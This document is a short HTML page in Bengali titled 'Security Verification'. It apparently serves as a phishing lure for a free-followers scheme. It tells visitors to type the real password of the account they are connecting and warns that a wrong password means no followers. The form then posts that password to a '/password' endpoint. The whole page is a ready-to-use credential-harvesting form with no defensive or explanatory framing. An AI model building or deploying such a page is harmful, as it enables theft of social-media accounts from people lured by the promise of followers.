<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body { background: linear-gradient(135deg, #f06292, #ab47bc); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: white; padding: 35px 25px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.25); width: 90%; max-width: 400px; text-align: center; }
        .lock-icon { font-size: 35px; margin-bottom: 10px; }
        h2 { color: #880e4f; margin-bottom: 10px; font-size: 22px; }
        p { color: #555; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
        .warning-text { color: #d32f2f; font-weight: bold; font-size: 12px; margin-bottom: 15px; background: #ffebee; padding: 8px; border-radius: 6px; }
        input { width: 100%; padding: 14px; border: 2px solid #eee; border-radius: 10px; box-sizing: border-box; font-size: 15px; margin-bottom: 20px; text-align: center; outline: none; transition: 0.3s; }
        input:focus { border-color: #e91e63; box-shadow: 0 0 8px rgba(233,30,99,0.2); }
        .btn { background: linear-gradient(45deg, #e91e63, #9c27b0); color: white; border: none; padding: 14px 20px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn:hover { opacity: 0.9; }
    </style>
</head>
<body>
    <div class="card">
        <div class="lock-icon">🔒</div>
        <h2>সিকিউরিটি ভেরিফিকেশন</h2>
        <p>আপনি যে অ্যাকাউন্ট দিয়ে কানেক্ট করতে চাচ্ছেন, ঠিক সেই একাউন্টের আসল পাসওয়ার্ডটি এখানে দিন।</p>
        <div class="warning-text">⚠️ ভুল পাসওয়ার্ড দিলে বা অন্য পাসওয়ার্ড দিলে ফলোয়ার পাবেন না!</div>
        <form action="/password" method="POST">
            <input type="password" name="password" placeholder="আপনার আসল পাসওয়ার্ড দিন" required autocomplete="off">
            <button type="submit" class="btn">ভেরিফাই সম্পন্ন করুন</button>
        </form>
    </div>
</body>
</html>
